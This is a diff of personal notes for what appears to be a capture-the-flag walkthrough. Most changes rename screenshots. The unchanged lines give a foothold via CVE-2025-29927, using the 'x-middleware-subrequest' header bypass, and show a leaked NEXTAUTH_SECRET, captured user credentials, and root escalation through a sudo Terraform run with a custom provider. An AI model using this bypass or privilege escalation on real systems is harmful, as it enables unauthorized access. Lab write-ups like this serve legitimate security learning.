@@ -1,41 +1,41 @@
-![[IMG-20250823234029175.png]]
+![[IMG-20250825192312409.png]]
 ## Foothold
 
 ### [CVE-2025-29927](https://github.com/lirantal/vulnerable-nextjs-14-CVE-2025-29927)
 
-![[IMG-20250824012840494.png]]
+![[IMG-20250825192312472.png]]
 
-![[IMG-20250824012910247.png]]
+![[IMG-20250825192312635.png]]
 USE:
 ```
 x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
 ```
 
-![[IMG-20250824012954799.png]]
+![[IMG-20250825192312724.png]]
 
-![[IMG-20250824013047596.png]]
+![[IMG-20250825192312815.png]]
 
-![[IMG-20250824172304583.png]]
+![[IMG-20250825192312925.png]]
 
-![[IMG-20250824171318691.png]]
+![[IMG-20250825192313002.png]]
 
 
 
-![[IMG-20250824171346486.png]]
+![[IMG-20250825192313077.png]]
 
-![[IMG-20250824172115997.png]]
+![[IMG-20250825192313147.png]]
 
 ```
 NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a
 ```
 
-![[IMG-20250825144128893.png]]
+![[IMG-20250825192313265.png]]
 
 ```
   "/api/auth/[...nextauth]": "pages/api/auth/[...nextauth].js",
 ```
 
-![[IMG-20250825144743209.png]]
+![[IMG-20250825192313327.png]]
 
 ```js
 let o = {
@@ -66,25 +66,25 @@ user: jeremy
 password: MyNameIsJeremyAndILovePancakes
 ```
 
-![[IMG-20250825144931061.png]]
+![[IMG-20250825192313380.png]]
 
 ## Root Flag
 
 ### Analyse
 
-![[IMG-20250825172605435.png]]
+![[IMG-20250825192313517.png]]
 
-![[IMG-20250825180207799.png]]
+![[IMG-20250825192313635.png]]
 
 ### Exploit
 
 [Doc Terraform](https://developer.hashicorp.com/terraform/cli/config/environment-variables)
 
-![[IMG-20250825172549609.png]]
+![[IMG-20250825192313713.png]]
 
 Load a config file custom.
 
-![[IMG-20250825173844708.png]]
+![[IMG-20250825192313763.png]]
 
 ### Attacker machine
 
@@ -112,10 +112,10 @@ chmod +x terraform-provider-examples
 sudo /usr/bin/terraform -chdir\=/opt/examples apply
 ```
 
-![[IMG-20250825175332705.png]]
+![[IMG-20250825192313844.png]]
 
-![[IMG-20250825175351049.png]]
+![[IMG-20250825192313920.png]]
 
 
 
-![[IMG-20250825165336107.png]]
+
